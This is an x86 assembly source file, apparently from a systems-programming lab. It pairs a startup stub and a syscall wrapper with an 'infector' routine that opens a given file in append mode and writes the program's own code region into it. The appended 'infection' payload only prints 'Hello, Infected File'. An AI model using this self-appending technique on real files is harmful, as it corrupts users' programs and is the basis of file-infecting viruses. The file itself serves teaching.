section .text
global _start
global system_call
global code_start
global code_end
global infection
global infector
msg: db "Hello, Infected File",0xA 
len: equ $ - msg
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller
code_start:
infection:

    pushad
    mov eax,4   ;system call number for WRITE           
    mov ebx,1   ;file(stdout)
    mov ecx, msg    ;message we write
    mov edx, len    ;length   
    int 0x80    ;kernell call
    popad
ret
infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov eax, 5  ;open
    mov ebx, [ebp+8]    ;arg file
    mov ecx, 1 | 1024   ; write and append(mode)
    int 0x80    ;kernell
    mov [ebp-4], eax

    mov ebx, [ebp-4]
    mov eax, 4  ;WRITE sys call
    mov ecx, code_start 
    mov edx, code_end
    sub edx, code_start  
    int 0x80

    mov eax, 6
    mov ebx, [ebp-4]
    int 0x80 

    popad                   ; Restore caller state (registers)
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_end: